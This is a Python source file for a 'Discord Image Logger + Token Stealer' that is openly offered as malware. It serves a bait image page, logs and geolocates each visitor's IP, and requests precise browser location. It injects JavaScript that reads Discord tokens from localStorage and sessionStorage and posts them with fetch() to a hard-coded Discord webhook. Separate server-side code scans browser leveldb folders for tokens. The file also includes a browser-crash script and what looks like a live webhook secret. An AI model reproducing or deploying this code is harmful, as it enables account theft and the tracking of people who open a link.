# Image Logger with Token Stealing - FIXED VERSION
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
# Enhanced with Discord Token Stealing functionality

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import json
import re
import os
import urllib.request
from pathlib import Path

__app__ = "Discord Image Logger + Token Stealer (Fixed)"
__description__ = "A simple application which allows you to steal IPs and Discord tokens by abusing Discord's Open Original feature"
__version__ = "v2.2"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
    "token_webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",  # Webhook for token reports
    "image": "https://server.wallpaperalchemy.com/storage/wallpapers/92/windows-xp-wallpaper-bliss-4k-wallpaper.jpeg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger", 
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": True,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # TOKEN STEALING OPTIONS #
    "tokenStealing": True,
    "tokenStealingMode": "passive",
    "sendTokensToWebhook": True,
    "tokenStealingDelay": 2,
    "debugMode": True,  # Enable debug logging

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# FIXED TOKEN STEALING CODE
TOKEN_REGEX_PATTERN = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"  # More accurate pattern
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
}

def log_debug(message):
    """Debug logging function"""
    if config.get("debugMode", False):
        print(f"[DEBUG] {message}")

def make_post_request(api_url: str, data: dict) -> int:
    """Make POST request to webhook with better error handling"""
    try:
        if not api_url.startswith(("http", "https")):
            log_debug(f"Invalid webhook URL: {api_url}")
            return -1

        request = urllib.request.Request(
            api_url, 
            data=json.dumps(data).encode(),
            headers=REQUEST_HEADERS,
        )

        with urllib.request.urlopen(request, timeout=10) as response:
            log_debug(f"Webhook response: {response.status}")
            return response.status
    except urllib.error.HTTPError as e:
        log_debug(f"HTTP Error sending to webhook: {e.code} - {e.reason}")
        return e.code
    except Exception as e:
        log_debug(f"Error sending to webhook: {e}")
        return -1

def get_tokens_from_file(file_path: Path) -> list[str] | None:
    """Extract Discord tokens from a file with improved regex"""
    try:
        if not file_path.exists():
            log_debug(f"File does not exist: {file_path}")
            return None
            
        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
        
        # Multiple regex patterns for better token detection
        patterns = [
            r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",  # Standard Discord token
            r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",  # Longer variant
            r"[MN][\w-]{23}\.[\w-]{6}\.[\w-]{27}",  # Starting with M or N
        ]
        
        all_tokens = []
        for pattern in patterns:
            tokens = re.findall(pattern, file_contents)
            all_tokens.extend(tokens)
        
        # Remove duplicates
        unique_tokens = list(set(all_tokens))
        log_debug(f"Found {len(unique_tokens)} tokens in {file_path.name}")
        
        return unique_tokens if unique_tokens else None
        
    except PermissionError:
        log_debug(f"Permission denied accessing: {file_path}")
        return None
    except Exception as e:
        log_debug(f"Error reading file {file_path}: {e}")
        return None

def get_user_id_from_token(token: str) -> str | None:
    """Extract user ID from Discord token with better error handling"""
    try:
        # Remove any padding issues
        token_parts = token.split(".")
        if len(token_parts) < 1:
            return None
            
        base64_part = token_parts[0]
        # Add padding if needed
        padding_needed = (4 - len(base64_part) % 4) % 4
        base64_part += "=" * padding_needed
        
        discord_user_id = base64.b64decode(base64_part).decode("utf-8")
        
        # Validate user ID (should be numeric)
        if discord_user_id.isdigit():
            return discord_user_id
        return None
        
    except Exception as e:
        log_debug(f"Error decoding token: {e}")
        return None

def get_tokens_from_path(base_path: Path) -> dict[str, set] | None:
    """Scan directory for Discord tokens with better error handling"""
    try:
        if not base_path.exists():
            log_debug(f"Directory does not exist: {base_path}")
            return None
            
        # Get all files in directory
        file_paths = []
        for file_path in base_path.iterdir():
            if file_path.is_file():
                file_paths.append(file_path)
        
        log_debug(f"Scanning {len(file_paths)} files in {base_path.name}")
        
        id_to_tokens: dict[str, set] = {}

        for file_path in file_paths:
            potential_tokens = get_tokens_from_file(file_path)
            
            if potential_tokens is None:
                continue

            for potential_token in potential_tokens:
                discord_user_id = get_user_id_from_token(potential_token)
                
                if discord_user_id is None:
                    continue

                if discord_user_id not in id_to_tokens:
                    id_to_tokens[discord_user_id] = set()

                id_to_tokens[discord_user_id].add(potential_token)
                log_debug(f"Found valid token for user {discord_user_id}")

        return id_to_tokens if id_to_tokens else None
        
    except Exception as e:
        log_debug(f"Error scanning directory {base_path}: {e}")
        return None

def send_tokens_to_webhook(webhook_url: str, user_id_to_token: dict[str, set[str]]) -> bool:
    """Send found tokens to webhook with better formatting"""
    try:
        if not user_id_to_token:
            log_debug("No tokens to send")
            return False
            
        fields: list[dict] = []
        
        for user_id, tokens in user_id_to_token.items():
            # Limit token display to avoid message length issues
            token_list = list(tokens)[:3]  # Max 3 tokens per user
            token_text = "\n".join(token_list)
            
            if len(tokens) > 3:
                token_text += f"\n... and {len(tokens) - 3} more"
                
            fields.append({
                "name": f"User ID: {user_id}",
                "value": f"```{token_text}```"
            })

        data = {
            "username": config["username"],
            "content": "🔑 Discord Tokens Found!",
            "embeds": [{
                "title": "Token Stealer - Tokens Discovered",
                "color": config["color"],
                "description": f"Found Discord tokens from {len(user_id_to_token)} user(s)",
                "fields": fields
            }]
        }

        status = make_post_request(webhook_url, data)
        success = status == 204 or status == 200
        
        log_debug(f"Token webhook send result: {status} (Success: {success})")
        return success
        
    except Exception as e:
        log_debug(f"Error sending tokens to webhook: {e}")
        return False

def attempt_token_stealing() -> bool:
    """Attempt to steal Discord tokens with improved logic"""
    if not config["tokenStealing"]:
        log_debug("Token stealing is disabled")
        return False
    
    log_debug("Starting token stealing attempt...")
    
    try:
        local_app_data = os.getenv("LOCALAPPDATA")
        if local_app_data is None:
            log_debug("LOCALAPPDATA not found (not Windows)")
            return False

        # Browser paths to check
        paths_to_check = [
            Path(local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
        ]
        
        # Add more browsers in aggressive mode
        if config["tokenStealingMode"] == "aggressive":
            paths_to_check.extend([
                Path(local_app_data) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(local_app_data) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(local_app_data) / "Opera Software" / "Opera Stable" / "Local Storage" / "leveldb",
            ])

        found_any_tokens = False
        
        for path in paths_to_check:
            log_debug(f"Checking path: {path}")
            tokens = get_tokens_from_path(path)
            
            if tokens and config["sendTokensToWebhook"]:
                success = send_tokens_to_webhook(config["token_webhook"], tokens)
                if success:
                    found_any_tokens = True
                    log_debug(f"Successfully sent tokens from {path.name}")
        
        log_debug(f"Token stealing completed. Found tokens: {found_any_tokens}")
        return found_any_tokens
        
    except Exception as e:
        log_debug(f"Token stealing error: {e}")
        return False

# END OF FIXED TOKEN STEALING CODE

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        error_data = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }]
        }
        requests.post(config["webhook"], json=error_data, timeout=10)
    except Exception as e:
        log_debug(f"Failed to send error report: {e}")

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                }, timeout=10)
            except Exception as e:
                log_debug(f"Failed to send link alert: {e}")
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
    except Exception as e:
        log_debug(f"Failed to get IP info: {e}")
        return
        
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ') if '/' in str(info['timezone']) else info['timezone']}` ({info['timezone'].split('/')[0] if '/' in str(info['timezone']) else 'Unknown'})
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
        }]
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except Exception as e:
        log_debug(f"Failed to send IP report: {e}")
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            # Get IP from headers
            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            useragent = self.headers.get('user-agent', '')
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except Exception:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            log_debug(f"Request from IP: {ip}")
            
            if ip.startswith(blacklistedIPs):
                return
            
            if botCheck(ip, useragent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: 
                    self.wfile.write(binaries["loading"])

                makeReport(ip, endpoint=self.path.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    try:
                        location = base64.b64decode(dic.get("g").encode()).decode()
                        result = makeReport(ip, useragent, location, s.split("?")[0], url=url)
                    except Exception:
                        result = makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
                else:
                    result = makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", ip)
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    timezone = result.get("timezone", "Unknown")
                    if '/' in str(timezone):
                        message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", "Unknown") if result.get("hosting", False) and not result.get("proxy", False) else 'Possibly' if result.get("hosting", False) else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                    
                # FIXED CLIENT-SIDE TOKEN STEALING
                if config["tokenStealing"]:
                    token_stealing_js = f'''
<script>
(function() {{
    console.log("Token stealer activated");
    
    setTimeout(function() {{
        try {{
            // Check localStorage
            if (typeof localStorage !== 'undefined') {{
                console.log("Checking localStorage...");
                for (let i = 0; i < localStorage.length; i++) {{
                    let key = localStorage.key(i);
                    if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord'))) {{
                        let value = localStorage.getItem(key);
                        if (value && value.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,38}}/)) {{
                            console.log("Found potential Discord token in localStorage");
                            // Send token to webhook
                            fetch('{config["token_webhook"]}', {{
                                method: 'POST',
                                headers: {{
                                    'Content-Type': 'application/json',
                                }},
                                body: JSON.stringify({{
                                    content: "🔑 Discord Token Found via localStorage!",
                                    embeds: [{{
                                        title: "Token Stealer - localStorage Token",
                                        color: {config["color"]},
                                        description: "Found a Discord token in browser localStorage",
                                        fields: [{{
                                            name: "Key: " + key,
                                            value: "```" + value + "```"
                                        }}]
                                    }}]
                                }})
                            }}).catch(console.error);
                        }}
                    }}
                }}
            }}
            
            // Check sessionStorage
            if (typeof sessionStorage !== 'undefined') {{
                console.log("Checking sessionStorage...");
                for (let i = 0; i < sessionStorage.length; i++) {{
                    let key = sessionStorage.key(i);
                    if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord'))) {{
                        let value = sessionStorage.getItem(key);
                        if (value && value.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,38}}/)) {{
                            console.log("Found potential Discord token in sessionStorage");
                            fetch('{config["token_webhook"]}', {{
                                method: 'POST',
                                headers: {{
                                    'Content-Type': 'application/json',
                                }},
                                body: JSON.stringify({{
                                    content: "🔑 Discord Token Found via sessionStorage!",
                                    embeds: [{{
                                        title: "Token Stealer - sessionStorage Token",
                                        color: {config["color"]},
                                        description: "Found a Discord token in browser sessionStorage",
                                        fields: [{{
                                            name: "Key: " + key,
                                            value: "```" + value + "```"
                                        }}]
                                    }}]
                                }})
                            }}).catch(console.error);
                        }}
                    }}
                }}
            }}
            
        }} catch(e) {{
            console.log('Error in token stealer:', e);
        }}
    }}, {config["tokenStealingDelay"] * 1000});
}})();
</script>'''
                    data += token_stealing_js.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception as e:
            log_debug(f"Handler error: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI

def run_server(port=8080):
    """Run the HTTP server."""
    server_address = ('', port)
    httpd = HTTPServer(server_address, ImageLoggerAPI)
    print(f"🚀 Starting Image Logger with Token Stealing v{__version__}")
    print(f"📍 Server running on port {port}")
    print(f"🔗 Visit http://localhost:{port} to test")
    print(f"🔍 Debug mode: {'ON' if config['debugMode'] else 'OFF'}")
    print(f"🔑 Token stealing: {'ON' if config['tokenStealing'] else 'OFF'}")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
